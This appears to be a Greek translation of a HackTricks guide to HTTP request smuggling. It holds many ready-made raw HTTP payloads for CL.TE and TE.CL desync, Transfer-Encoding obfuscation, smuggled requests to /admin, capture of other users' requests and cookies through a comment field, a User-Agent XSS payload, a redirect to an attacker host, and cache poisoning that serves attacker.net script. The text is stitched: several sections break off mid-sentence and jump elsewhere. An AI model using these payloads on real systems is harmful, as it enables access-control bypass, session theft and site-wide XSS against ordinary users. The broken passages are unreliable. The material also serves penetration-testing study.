# HTTP Request Smuggling / Επίθεση HTTP Desync

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Τι είναι

Αυτή η ευπάθεια συμβαίνει όταν μια **ασυγχρονισμένη** μεταξύ **μπροστινών προξενών** και του **εξυπηρετητή** επιτρέπει σε έναν **επιτιθέμενο** να **στείλει** ένα HTTP **αίτημα** που θα **ερμηνευθεί** ως ένα **μόνο αίτημα** από τις **μπροστινές** προξενούς (φορτοεξισορροπητής/αντίστροφη προξενεία) και ως **2 αιτήματα** από τον **εξυπηρετητή**.\
Αυτό επιτρέπει σε έναν χρήστη να **τροποποιήσει το επόμενο αίτημα που φτάνει στον εξυπηρετητή μετά από αυτόν**.

### Θεωρία

[**Προδιαγραφή RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Εάν ληφθεί ένα μήνυμα με και το πεδίο κεφαλίδας Transfer-Encoding και το πεδίο κεφαλίδας Content-Length, το τελευταίο ΠΡΕΠΕΙ να αγνοηθεί.

**Content-Length**

> Η κεφαλίδα οντότητας Content-Length υποδεικνύει το μέγεθος του σώματος της οντότητας, σε bytes, που στέλνεται στον παραλήπτη.

**Transfer-Encoding: chunked**

> Η κεφαλίδα Transfer-Encoding καθορίζει τη μορφή κωδικοποίησης που χρησιμοποιείται για την ασφαλή μεταφορά του σώματος φορτίου στον χρήστη.\
> Το Chunked σημαίνει ότι μεγάλα δεδομένα στέλνονται σε μια σειρά από κομμάτια

### Πραγματικότητα

Το **Μπροστινό Τμήμα** (ένας φορτοεξορροπητής/Αντίστροφη Προξενεία) **επεξεργάζεται** την _**κεφαλίδα content-length**_ ή την _**κωδικοποίηση μεταφοράς**_ και ο **Εξυπηρετητής** επεξεργάζεται την άλλη προκαλώντας μια **ασυγχρονισμένη** μεταξύ των 2 συστημάτων.\
Αυτό θα μπορούσε να είναι πολύ κρίσιμο καθώς **ένας επιτιθέμενος θα μπορούσε να στείλει ένα αίτημα** στον αντίστροφο προξενεία που θα **ερμηνευθεί** από τον **εξυπηρετητή** ως **2 διαφορετικά αιτήματα**. Ο **κίνδυνος** αυτής της τεχνικής έγκειται στο γεγονός ότι ο **εξυπηρετητής** θα **ερμηνεύσει** το **2ο ενσωματωμένο αίτημα** σαν να **προέρχεται από τον επόμενο πελάτη** και το **πραγματικό αίτημα** αυτού του πελάτη θα είναι **μέρος** του **ενσωματωμένου αιτήματος**.

### Ειδικότητες

Θυμηθείτε ότι στο HTTP **ένα χαρακτήρας νέας γραμμής αποτελείται από 2 bytes:**

* **Content-Length:** Αυτή η κεφαλίδα χρησιμοποιεί ένα **δεκαδικό αριθμό** για να υποδείξει τον **αριθμό** των **bytes** του **σώματος** του αιτήματος. Αναμένεται το σώμα να τελειώνει στον τελευταίο χαρακτήρα, **δεν απαιτείται μια νέα γραμμή στο τέλος του αιτήματος**.
* **Transfer-Encoding:** Αυτή η κεφαλίδα χρησιμοποιεί στο **σώμα** ένα **εξαδικαδικό αριθμό** για να υποδείξει τον **αριθμό** των **bytes** του **επόμενου κομματιού**. Το **κομμάτι** πρέπει να **τελειώσει** με μια **νέα γραμμή** αλλά αυτή η νέα γραμμή **δεν μετράται** από τον δείκτη μήκους. Αυτή η μέθοδος μεταφοράς πρέπει να τελειώσει με ένα **κομμάτι μεγέθους 0 ακολουθούμενο από 2 νέες γραμμές**: `0`

## Βασικά Παραδείγματα

{% hint style="success" %}
Όταν προσπαθείτε να εκμεταλλευτείτε αυτό με το Burp Suite **απενεργοποιήστε το `Ενημέρωση Μήκους Περιεχομένου` και το `Κανονικοποίηση Τελειώματος Γραμμής HTTP/1`** στον επαναλήπτη επειδή μερικές συσκευές καταχρώνται νέες γραμμές, αλλαγές γραμμών και ανεπαρκή μήκη περιεχομένου.
{% endhint %}

Οι επιθέσεις αποστολής HTTP request smuggling δημιουργούνται με την αποστολή ασαφών αιτημάτων που εκμεταλλεύονται αντιφάσεις στον τρόπο με τον οποίο οι μπροστινές και οι πίσω εξυπηρετητές ερμηνεύουν τις κεφαλίδες `Content-Length` (CL) και `Transfer-Encoding` (TE). Αυτές οι επιθέσεις μπορούν να εκδηλωθούν σε διαφορετικές μορφές, κυρίως ως **CL.TE**, **TE.CL** και **TE.TE**. Κάθε τύπος αντιπροσωπεύει μια μοναδική συνδυασμένη προτεραιότητα των μπροστινών και των πίσω εξυπηρετητών σε αυτές τις κεφαλίδες. Οι ευπάθειες προκύπτουν από τους εξυπηρετητές που επεξεργάζονται το ίδιο αίτημα με διαφορετικούς τρόπους, οδηγώντας σε απροσδόκητα και ενδεχομένως κακόβουλα αποτελέσματα.

### Βασικά Παραδείγματα Τύπων Ευπαθειών

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Ευπάθεια CL.TE (Χρήση Content-Length από το Μπροστινό Τμήμα, Χρήση Transfer-Encoding από τον Πίσω Τμήμα)

* **Μπροστινό Τμήμα (CL):** Επεξεργάζεται το αίτημα με βάση την κεφαλίδα `Content-Length`.
* **Πίσω Τμήμα (TE):** Επεξεργάζεται το αίτημα με βάση την κεφαλίδα `Transfer-Encoding`.
* **Σενάριο Επίθεσης:**
* Ο επιτιθέμενος στέλνει ένα αίτημα όπου η τιμή της κεφαλίδας `Content-Length` δεν ταιριάζει με το πραγματικό μήκος περιεχομένου.
* Ο μπροστινός εξυπηρετητής προωθεί ολόκληρο το αίτημα στον πίσω εξυπηρετητή
#### Ευπάθεια TE.TE (Χρήση μεταφοράς και από τα δύο, με απόκρυψη)

* **Διακομιστές:** Και τα δύο υποστηρίζουν το `Transfer-Encoding`, αλλά ο ένας μπορεί να εξαπατηθεί ώστε να το αγνοήσει μέσω απόκρυψης.
* **Σενάριο Επίθεσης:**
* Ο επιτιθέμενος στέλνει ένα αίτημα με αποκρυμμένους κεφαλίδες `Transfer-Encoding`.
* Ανάλογα με τον διακομιστή (μπροστινό ή πίσω) που αποτυγχάνει να αναγνωρίσει την απόκρυψη, μπορεί να εκμεταλλευτείτε μια ευπάθεια CL.TE ή TE.CL.
* Το μη επεξεργασμένο τμήμα του αιτήματος, όπως το βλέπει ένας από τους διακομιστές, γίνεται μέρος ενός επόμενου αιτήματος, οδηγώντας σε κακόβουλη διακίνηση.
*   **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Σενάριο CL.CL (Μήκος-Περιεχομένου χρησιμοποιούμενο από και τους δύο Διακομιστές):**

* Και οι δύο διακομιστές επεξεργάζονται το αίτημα μόνο βασιζόμενοι στην κεφαλίδα `Content-Length`.
* Αυτό το σενάριο συνήθως δεν οδηγεί σε διακίνηση, καθώς υπάρχει συμφωνία στον τρόπο με τον οποίο οι δύο διακομιστές ερμηνεύουν το μήκος του αιτήματος.
*   **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Κανονικό Αίτημα
```

#### **Σενάριο CL != 0:**

* Αναφέρεται σε σενάρια όπου η κεφαλίδα `Content-Length` είναι παρούσα και έχει μια τιμή διαφορετική από το μηδέν, υποδηλώνοντας ότι το σώμα του αιτήματος έχει περιεχόμενο.
* Είναι κρίσιμο για την κατανόηση και τη δημιουργία επιθέσεων διακίνησης, καθώς επηρεάζει τον τρόπο με τον οποίο οι διακομιστές καθορίζουν το τέλος ενός αιτήματος.
*   **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Μη-Κενό Σώμα
```

#### Εξαναγκάζοντας μέσω κεφαλίδων hop-by-hop

Καταχρώντας τις κεφαλίδες hop-by-hop μπορείτε να υποδείξετε στον διαμεσολαβητή να **διαγράψει την κεφαλίδα Content-Length ή Transfer-Encoding έτσι ώστε να είναι δυνατή η κακόβουλη διακίνηση ενός HTTP αιτήματος**.
```
Connection: Content-Length
```
Για **περισσότερες πληροφορίες σχετικά με τις κεφαλίδες hop-by-hop** επισκεφθείτε:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Εντοπισμός HTTP Request Smuggling

Η εντοπισμός ευπαθειών στο HTTP request smuggling μπορεί συχνά να επιτευχθεί χρησιμοποιώντας τεχνικές χρονομέτρησης, οι οποίες βασίζονται στο να παρατηρείτε πόσο καιρό χρειάζεται στον εξυπηρετητή να ανταποκριθεί σε παραμορφωμένα αιτήματα. Αυτές οι τεχνικές είναι ιδιαίτερα χρήσιμες για τον εντοπισμό των ευπαθειών CL.TE και TE.CL. Εκτός από αυτές τις μεθόδους, υπάρχουν και άλλες στρατηγικές και εργαλεία που μπορούν να χρησιμοποιηθούν για τον εντοπισμό τέτοιων ευπαθειών:

### Εντοπισμός Ευπαθειών CL.TE Χρησιμοποιώντας Τεχνικές Χρονομέτρησης

* **Μέθοδος:**
* Αποστολή ενός αιτήματος που, αν η εφαρμογή είναι ευάλωτη, θα οδηγήσει τον εξυπηρετητή να περιμένει για επιπλέον δεδομένα.
*   **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Παρατήρηση:**
* Ο εξυπηρετητής front-end επεξεργάζεται το αίτημα με βάση το `Content-Length` και διακόπτει το μήνυμα πρόωρα.
* Ο εξυπηρετητής back-end, περιμένοντας ένα μήνυμα σε κομμάτια, περιμένει το επόμενο κομμάτι που δεν φτάνει ποτέ, προκαλώντας καθυστέρηση.
* **Ενδείξεις:**
* Διακοπές χρόνου ή μεγάλες καθυστερήσεις στην απόκριση.
* Λήψη σφάλματος 400 Bad Request από τον εξυπηρετητή back-end, μερικές φορές με λεπτομερείς πληροφορίες του εξυπηρετητή.

### Εντοπισμός Ευπαθειών TE.CL Χρησιμοποιώντας Τεχνικές Χρονομέτρησης

* **Μέθοδος:**
* Αποστολή ενός αιτήματος που, αν η εφαρμογή είναι ευάλωτη, θα οδηγήσει τον εξυπηρετητή να περιμένει για επιπλέον δεδομένα.
*   **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Παρατήρηση:**
* Ο εξυπηρετητής front-end επεξεργάζεται το αίτημα με βάση το `Transfer-Encoding` και προωθεί ολόκληρο το μήνυμα.
* Ο εξυπηρετητής back-end, περιμένοντας ένα μήνυμα με βάση το `Content-Length`, περιμένει επιπλέον δεδομένα που δεν φτάνουν ποτέ, προκαλώντας καθυστέρηση.

### Άλλες Μέθοδοι για τον Εντοπισμό Ευπαθειών

* **Ανάλυση Διαφορετικών Αποκρίσεων:**
* Αποστολή ελαφρώς διαφορετικών εκδόσεων ενός αιτήματος και παρατήρηση αν οι αποκρίσεις του εξυπηρετητή διαφέρουν με έναν αναπάντεχο τρόπο, υποδεικνύοντας μια αντίφαση στην ανάλυση.
* **Χρήση Αυτοματοποιημένων Εργαλείων:**
* Εργαλεία όπως η επέκταση 'HTTP Request Smuggler' του Burp Suite μπορούν να ελέγξουν αυτόματα αυτές τις ευπαθείες αποστέλλοντας διάφορες μορφές ασαφών αιτημάτων και αναλύοντας τις αποκρίσεις.
* **Δοκιμές Διακυμάνσεων Μήκους Περιεχομένου:**
* Αποστολή αιτημάτων με διαφορετικές τιμές `Content-Length` που δεν είναι συγχρονισμένες με το πραγματικό μήκος περιεχομένου και παρατήρηση πώς ο εξυπηρετητής χειρίζεται τέτοιες αντικρουόμενες τιμές.
* **Δοκιμές Διακυμάνσεων Μεταφοράς Κωδικοποίησης:**
* Αποστολή αιτημάτων με αμφισβητούμενους ή μη έγκυρους κεφαλίδες `Transfer-Encoding` και παρακολούθηση πώς αντιδρούν διαφορετικά οι εξυπηρετητές front-end και back-end σε τέτοιες παραπλανητικές ενέργειες.

### Δοκιμή Ευπαθειών στο HTTP Request Smuggling

Μετά την επιβεβαίωση της αποτελεσματικότητας των τεχνικών χρονομέτρησης, είναι κρίσιμο να επαληθεύσετε αν τα αιτήματα των πελατών μπορούν να παραπλανηθούν. Μια απλή μέθοδος είναι να προσπαθήσετε να δηλητηριάσετε τα αιτήματά σας, για παράδειγμα, να κάνετε ένα αίτημα στο `/` να οδηγεί σε απάντηση 404. Τα παραδείγματα `CL.TE` και `TE.CL` που συζητήθηκαν προηγουμένως στο [Βασικά Παραδείγματα](./#basic-examples) δείχνουν πώς να δηλητηριάσετε το αίτημα ενός πελάτη για να προκαλέσετε μια απάντηση 404, παρά το γεγονός ότι ο πελάτης στοχεύει να έχει πρόσβαση σε διαφορετικό πόρο.

**Κύριες Επισημάνσεις**

Κατά τον έλεγχο για ευπαθείες στο request smuggling με την παρεμβολή σε άλλα αιτήματα, να έχετε υπόψη:

* **Διακριτικές Δικτυακές Συνδέσεις:** Τα "επίθεση" και "κανονικά" αιτήματα πρέπει να αποστέλλονται μέσω ξεχωριστών δικτυακών συνδέσεων. Η χρήση της ίδιας σύνδεσης για και τα δύο δεν επιβεβαιώνει την ύπαρξη της ευπαθείας.
* **Συνεπείς URL και Παράμετροι:** Στόχος είναι να χρησιμοποιήσετε ίδια URLs και ονόματα παραμέτρων για τα δύο αιτήματα. Οι σύγχρονες εφαρμογές συχνά κατευθύνουν τα αιτήματα σε συγκεκριμένους εξυπηρετητές βάση URL και παραμέτρων. Η ταύτιση αυτών αυξάνει τις πιθανότητες να επεξεργαστούν τα δύο αιτήματα από τον ίδιο εξυπηρετητή, προϋπόθεση για μια επιτυχημένη επίθεση.
* **Χρονισμός και Συνθήκες Ανταγωνισμού:** Το "κανονικό" αίτημα, που προορίζεται να ανιχνεύσει παρεμβολές από το "επίθεση" αίτημα, ανταγωνίζεται ενάντια σε άλλα ταυτόχρονα αιτήματα της εφαρμογής. Επομένως, στείλτε το "κανονικό" αίτημα αμέσως μετά το "επίθεση" αίτημα. Οι απασχολημένες εφαρμογές μπορεί να απαιτούν πολλαπλές δοκιμές για την οριστική επιβεβαίωση της ευπαθείας.
* **Προκλήσεις Ισορροπίας Φορτίου:** Οι εξυπηρετητές front-end που λειτουργούν ως ισορροπητές φορτίου μπορεί να διανέμουν τα αιτήματα σε διάφορα συστήματα back-end. Αν τα "επίθεση" και "κανονικά" αιτήματα καταλήξουν σε διαφορετικά συστήματα
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Στην επίθεση CL.TE, το κεφαλίδα `Content-Length` χρησιμοποιείται για το αρχικό αίτημα, ενώ το ενσωματωμένο αίτημα χρησιμοποιεί το κεφαλίδα `Transfer-Encoding: chunked`. Το εμπρόσθιο πρόξι επεξεργάζεται το αρχικό αίτημα `POST` αλλά αποτυγχάνει να επιθεωρήσει το ενσωματωμένο αίτημα `GET /admin`, επιτρέποντας την μη εξουσιοδοτημένη πρόσβαση στη διαδρομή `/admin`.

**Παράδειγμα TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Αντίστροφα, στην επίθεση TE.CL, το αρχικό αίτημα `POST` χρησιμοποιεί `Transfer-Encoding: chunked`, και το ενσωματωμένο αίτημα που ακολουθεί επεξεργάζεται με βάση την κεφαλίδα `Content-Length`. Παρόμοια με την επίθεση CL.TE, το μπροστινό προξενείο παραβλέπει το εισιτήριο `GET /admin` που έχει ενσωματωθεί, χορηγώντας απρόθυμα πρόσβαση στην περιορισμένη διαδρομή `/admin`.

### Αποκάλυψη αναδιατύπωσης αιτημάτων μπροστινού τμήματος <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Οι εφαρμογές χρησιμοποιούν συχνά έναν **διακομιστή μπροστινού τμήματος** για να τροποποιήσουν τα εισερχόμενα αιτήματα πριν τα περάσουν στον διακομιστή πίσω από αυτόν. Μια τυπική τροποποίηση περιλαμβάνει την προσθήκη κεφαλίδων, όπως `X-Forwarded-For: <IP του πελάτη>`, για να μεταφέρει τη διεύθυνση IP του πελάτη στον διακομιστή πίσω από αυτόν. Η κατανόηση αυτών των τροποποιήσεων μπορεί να είναι κρίσιμη, καθώς ενδέχεται να αποκαλύψει τρόπους για **παράκαμψη προστασιών** ή **αποκάλυψη κρυφών πληροφοριών ή σημείων πρόσβασης**.

Για να εξετάσετε πώς ένα προξενείο τροποποιεί ένα αίτημα, εντοπίστε ένα παράμετρο POST που ο διακομιστής πίσω απαντά με αυτήν στην απόκριση. Στη συνέχεια, δημιουργήστε ένα αίτημα, χρησιμοποιώντας αυτήν την παράμετρο τελευταία, παρόμοια με το παρακάτω:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Σε αυτή τη δομή, τα στοιχεία των συνεχόμενων αιτημάτων προστίθενται μετά το `search=`, το οποίο είναι η παράμετρος που αντανακλάται στην απόκριση. Αυτή η αντανάκλαση θα αποκαλύψει τις κεφαλίδες του επόμενου αιτήματος.

Είναι σημαντικό να ευθυγραμμίσετε την κεφαλίδα `Content-Length` του εμφωλευμένου αιτήματος με το πραγματικό μήκος περιεχομένου. Ξεκινώντας με μια μικρή τιμή και αυξάνοντας σταδιακά είναι συμβουλευτικό, καθώς μια πολύ χαμηλή τιμή θα περικόψει τα αντανακλασμένα δεδομένα, ενώ μια πολύ υψηλή τιμή μπορεί να προκαλέσει σφάλμα στο αίτημα.

Αυτή η τεχνική είναι επίσης εφαρμόσιμη στο πλαίσιο μιας ευπαθότητας TE.CL, αλλά το αίτημα πρέπει να τερματιστεί με `search=\r\n0`. Ανεξάρτητα από τους χαρακτήρες αλλαγής γραμμής, οι τιμές θα προστεθούν στην παράμετρο αναζήτησης.

Αυτή η μέθοδος υπηρετεί κυρίως για την κατανόηση των τροποποιήσεων αιτημάτων που πραγματοποιούνται από τον εμπρόσθιο διακομιστή, εκτελώντας ουσιαστικά μια έρευνα που οδηγείται από τον ίδιο τον χρήστη.

### Καταγραφή αιτημάτων άλλων χρηστών <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Είναι εφικτό να καταγράψετε τα αιτήματα του επόμενου χρήστη προσθέτοντας ένα συγκεκριμένο αίτημα ως την τιμή μιας παραμέτρου κατά τη διάρκεια μιας λειτουργίας POST. Έτσι μπορεί να επιτευχθεί: 

Προσθέτοντας το ακόλουθο αίτημα ως τιμή μιας παραμέτρου, μπορείτε να αποθηκεύσετε το αίτημα του επόμενου πελάτη:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Σε αυτό το σενάριο, η παράμετρος **σχόλιο** προορίζεται να αποθηκεύσει τα περιεχόμενα ενός τμήματος σχολίου σε μια δημόσια προσβάσιμη σελίδα. Ως εκ τούτου, τα περιεχόμενα του επόμενου αιτήματος θα εμφανιστούν ως σχόλιο.

Ωστόσο, αυτή η τεχνική έχει περιορισμούς. Γενικά, αποθανατίζει δεδομένα μόνο μέχρι τον διαχωριστή παραμέτρων που χρησιμοποιείται στο κλοπισμένο αίτημα. Για υποβολές φόρμας κωδικοποιημένες σε URL, αυτός ο διαχωριστής είναι το χαρακτήρας `&`. Αυτό σημαίνει ότι το καταγεγραμμένο περιεχόμενο από το αίτημα του χρήστη θύματος θα σταματήσει στο πρώτο `&`, το οποίο μπορεί ακόμη και να αποτελεί μέρος της συμβολοσειράς ερωτήματος.

Επιπλέον, αξίζει να σημειωθεί ότι αυτή η προσέγγιση είναι επίσης εφικτή με μια ευπάθεια TE.CL. Σε τέτοιες περιπτώσεις, το αίτημα θα πρέπει να ολοκληρωθεί με `search=\r\n0`. Ανεξάρτητα από τους χαρακτήρες αλλαγής γραμμής, οι τιμές θα προστεθούν στην παράμετρο αναζήτησης.

### Χρήση της κλοπής HTTP αιτήματος για εκμετάλλευση αντανακλαστικού XSS

Η Κλοπή HTTP Αιτήματος μπορεί να χρησιμοποιηθεί για να εκμεταλλευτεί ιστοσελίδες ευάλωτες σε **Αντανακλαστικό XSS**, προσφέροντας σημαντικά πλεονεκτήματα:

* Δεν απαιτείται **αλληλεπίδραση** με τους στόχους.
* Επιτρέπει την εκμετάλλευση του XSS σε τμήματα του αιτήματος που είναι **συνήθως μη προσβάσιμα**, όπως οι κεφαλίδες αιτήματος HTTP.

Σε σενάρια όπου μια ιστοσελίδα είναι ευάλωτη στο Αντανακλαστικό XSS μέσω της κεφαλίδας User-Agent, το παρακάτω φορτίο δείχνει πώς να εκμεταλλευτείτε αυτήν την ευπάθεια:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Αυτό το φορτίο είναι δομημένο για να εκμεταλλευτεί την ευπάθεια με τους παρακάτω τρόπους:

1. Έναρξη ενός αιτήματος `POST`, που φαίνεται τυπικό, με ένα κεφαλίδα `Transfer-Encoding: chunked` για να υποδείξει την έναρξη του smuggling.
2. Ακολουθεί με ένα `0`, σηματοδοτώντας το τέλος του σώματος μηνύματος chunked.
3. Στη συνέχεια, εισάγεται ένα smuggled αίτημα `GET`, όπου η κεφαλίδα `User-Agent` εισάγεται με ένα script, `<script>alert(1)</script>`, ενεργοποιώντας το XSS όταν ο διακομιστής επεξεργάζεται αυτό το επόμενο αίτημα.

Με τη χρήση του smuggling στο `User-Agent`, το φορτίο παρακάμπτει τους κανονικούς περιορισμούς αιτημάτων, εκμεταλλευόμενο την ευπάθεια Reflected XSS με έναν μη τυπικό, αλλά αποτελεσματικό τρόπο.

### Χρήση του HTTP request smuggling για να μετατρέψετε μια επανακατεύθυνση στον ιστότοπο σε μια ανοικτή επανακατεύθυνση <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Εκμεταλλευόμενοι τις Επανακατευθύνσεις Εντός του Ιστότοπου με το HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Οι εφαρμογές συχνά κάνουν επανακατευθύνσεις από ένα URL σε ένα άλλο χρησιμοποιώντας το όνομα κεφαλίδας `Host` στο URL επανακατεύθυνσης. Αυτό είναι συνηθισμένο με διακομιστές ιστού όπως το Apache και το IIS. Για παράδειγμα, η αίτηση ενός φακέλου χωρίς κάθετο γραμμή οδηγεί σε μια επανακατεύθυνση που περιλαμβάνει την κάθετο γραμμή:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Αποτελέσματα:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Αν και φαίνεται ανώδυνο, αυτή η συμπεριφορά μπορεί να χειριστεί χρησιμοποιώντας HTTP request smuggling για να ανακατευθύνει τους χρήστες σε εξωτερικό ιστότοπο. Για παράδειγμα:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Αυτό το κρυφό αίτημα μπορεί να οδηγήσει το επόμενο επεξεργασμένο αίτημα χρήστη να ανακατευθυνθεί σε μια ιστοσελίδα που ελέγχεται από τον επιτιθέμενο:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Αποτελέσματα:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Χρήση HTTP request smuggling για να πραγματοποιηθεί δηλητηρίαση της μνήμης cache του web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Εκμεταλλευόμενοι τη Δηλητηρίαση της Μνήμης Cache του Web μέσω HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Η δηλητηρίαση της μνήμης cache του web μπορεί να πραγματοποιηθεί εάν οποιοδήποτε στοιχείο της υποδομής **front-end κρατάει στη μνήμη cache περιεχόμενο**, συνήθως για να βελτιώσει την απόδοση. Με την παραπλάνηση της απάντησης του διακομιστή, είναι δυνατόν να **δηλητηριάσετε τη μνήμη cache**.

Προηγουμένως, παρατηρήσαμε πώς οι απαντήσεις του διακομιστή μπορούσαν να τροποποιηθούν για να επιστρέψουν ένα σφάλμα 404 (ανατρέξτε στα [Βασικά Παραδείγματα](./#basic-examples)). Με παρόμοιο τρόπο, είναι εφικτό να εξαπατηθεί ο διακομιστής ώστε να παραδώσει το περιεχόμενο `/index.html` αντί για το αίτημα για το `/static/include.js`. Ως εκ τούτου, το περιεχόμενο του `/static/include.js` αντικαθίσταται στη μνήμη cache με αυτό του `/index.html`, καθιστώντας το `/static/include.js` μη προσβάσιμο για τους χρήστες, πιθανώς οδηγώντας σε μια Αρνηση Υπηρεσίας (DoS).

Αυτή η τεχνική γίνεται ιδιαίτερα ισχυρή εάν ανακαλυφθεί μια **ευπάθεια σε Ανοικτή Ανακατεύθυνση** ή αν υπάρχει **επανακατεύθυνση σε μια ανοικτή ανακατεύθυνση στον ιστότοπο**. Τέτοιες ευπάθειες μπορούν να εκμεταλλευτούνται για να αντικατασταθεί το περιεχόμενο που κρατείται στη μνήμη cache του `/static/include.js` με ένα script υπό τον έλεγχο του επιτιθέμενου, ενεργοποιώντας ουσιαστικά μια ευρεία επίθεση Cross-Site Scripting (XSS) εναντίον όλων των πελατών που ζητούν το ενημερωμένο `/static/include.js`.

Παρακάτω παρουσιάζεται μια εικόνα της εκμετάλλευσης **δηλητηρίασης της μνήμης cache σε συνδυασμό με μια επανακατεύθυνση σε ανοικτή ανακατεύθυνση στον ιστότοπο**. Ο στόχος είναι να τροποποιηθεί το περιεχόμενο της μνήμης cache του `/static/include.js` για να παρέχει κώδικα JavaScript που ελέγχεται από τον επιτιθέμενο:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
